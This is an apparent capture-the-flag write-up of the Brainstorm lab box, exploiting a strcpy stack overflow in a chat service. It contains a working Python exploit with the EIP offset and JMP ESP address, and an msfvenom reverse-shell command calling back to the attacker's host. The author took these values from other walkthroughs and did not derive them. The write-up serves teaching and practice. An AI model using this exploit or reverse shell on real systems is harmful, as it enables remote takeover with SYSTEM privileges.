Brainstorm

Date 2026-10-06
Difficulty Medium

// Overview

Brainstorm is a Windows box built around a classic stack-based buffer overflow in a custom chat service. You enumerate the box, pull the vulnerable binaries off an anonymous FTP share, reverse the crash, and redirect execution into shellcode. The exploitation path is a standard x86 Windows BOF, and the reward is a shell as NT AUTHORITY\SYSTEM because the service runs with high privileges. Unlike a misconfiguration chain, the bug here is a genuine memory-safety flaw: an unchecked strcpy into a fixed-size stack buffer.

// Reconnaissance

Port and Service Discovery

Ping is disabled, so a full sweep with -Pn is required. Three services surface: FTP, RDP, and a custom chat daemon on 9999.

$ nmap -p- -Pn -sV <target_ip>

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
3389/tcp open  tcpwrapped
9999/tcp open  abyss?

Port 9999 fingerprints as some kind of chat application, and connecting to it confirms that. The service asks for a username (capped at 20 characters), then a message, which it echoes back.

$ nc <target_ip> 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters):
> hacker
Write your message:
> hello

FTP Enumeration

Anonymous login is enabled. The share contains a single directory with two files: chatserver.exe and essfunc.dll. These are the service binary and its dependency, exactly what we need to analyze locally.

$ ftp <target_ip>
Name: anonymous
Password: (blank)

ftp> passive
Passive mode: off

ftp> cd chatserver
ftp> binary
ftp> mget *
FTP note: the server's passive-mode data connection often times out on THM's network. Toggling passive off before listing or downloading avoids the stall. If it still fails, pulling the files from the AttackBox and transferring them to a Windows host is a reliable fallback.

// Confirming the Crash

Before touching offsets, verify the service is actually vulnerable. Send an oversized message after the username and watch the connection die: the process has crashed.

#!/usr/bin/env python3
import socket

TARGET = "<target_ip>"
PORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((TARGET, PORT))
s.recv(1024)                          # banner
s.send(b"hacker\r\n")                 # username
s.recv(1024)                          # prompt
s.send(b"A" * 3000 + b"\r\n")         # oversized message
s.close()

If the service stops responding after this, the buffer overflow is confirmed. The exact crash threshold varies slightly between write-ups: some report a crash around 2100 bytes, others closer to 2500–3000, but the offset that matters is consistent.

On the debugger: deriving the crash in Immunity Debugger is the canonical path and is covered thoroughly elsewhere. The values below (offset, JMP ESP address, bad characters) are consistent across the walkthroughs I checked, so the exploitation section can proceed directly to payload assembly.

// Offset, Bad Characters, and JMP ESP

Three values turn the crash into control:

EIP offset:        2012 bytes
JMP ESP address:   0x625014DF  (essfunc.dll)
Bad characters:    \x00

The offset of 2012 means the first 2012 bytes of the message fill the stack buffer and saved registers; the next four bytes land directly in EIP. The JMP ESP at 0x625014DF lives in essfunc.dll, which lacks ASLR and DEP, making it a reliable landing pad. The only bad character is the null byte, which matters for shellcode generation.

To verify EIP control manually, replace the four bytes after the offset with BBBB and check that EIP becomes 42424242 in a debugger. For the final exploit, those four bytes become the JMP ESP address in little-endian: \xdf\x14\x50\x62.

// Exploitation: Stack Smash → Reverse Shell

Generate a null-free Windows reverse shell with msfvenom. Substitute your attacking machine address and chosen listener port.

$ msfvenom -p windows/shell_reverse_tcp \
    LHOST=<your_ip> LPORT=4444 \
    EXITFUNC=thread -b "\x00" -f c

The payload layout is the standard shape: offset + EIP + NOP sled + shellcode. A short NOP sled after the JMP ESP improves reliability by absorbing minor stack misalignment before the shellcode executes.

#!/usr/bin/env python3
import socket, sys

TARGET = "<target_ip>"
PORT   = 9999

offset      = 2012
eip         = b"\xdf\x14\x50\x62"       # 0x625014DF, little-endian
nop_sled    = b"\x90" * 16

# Paste msfvenom output here as a bytes literal
shellcode = b"\xfc\xe8\x82..."          # truncated

payload = b"A" * offset + eip + nop_sled + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((TARGET, PORT))
s.recv(1024)                            # banner
s.send(b"hacker\r\n")                   # username (≤20 chars)
s.recv(1024)                            # prompt
s.send(payload + b"\r\n")               # exploit
s.close()
print("[+] Payload sent")

Start a listener before running the script:

$ nc -nvlp 4444

On success, the listener catches a shell running as NT AUTHORITY\SYSTEM. The service's privilege level means no local escalation is required — the BOF is the whole chain.

Why this works: chatserver.exe copies the user-supplied message into a fixed-size stack buffer with strcpy and no length check. Sending 2012 bytes of padding reaches the saved return address; the next four bytes overwrite it with the address of a jmp esp instruction in an unprotected DLL; execution flows to the stack, where the NOP sled leads into shellcode.

// Verdict

Brainstorm earns its Medium rating not through exotic steps but through the demand it places on understanding. Every value in the exploit is meaningless unless you know what EIP is, why a JMP ESP is necessary, and why the DLL's lack of ASLR/DEP matters. That's a different kind of difficulty from ToolsRUs, where the "vulnerability" was an exposed administrative feature. Here the bug is a real memory-safety flaw: a strcpy with no bounds check, the same class of defect that still produces CVEs in production software. The SYSTEM shell is almost incidental; the teaching moment is watching the CPU jump where you told it to. If you just want the flag, the offset is stable and the exploit script above works.

→ 7/10 — a proper memory-safety room; the offset is the lesson.
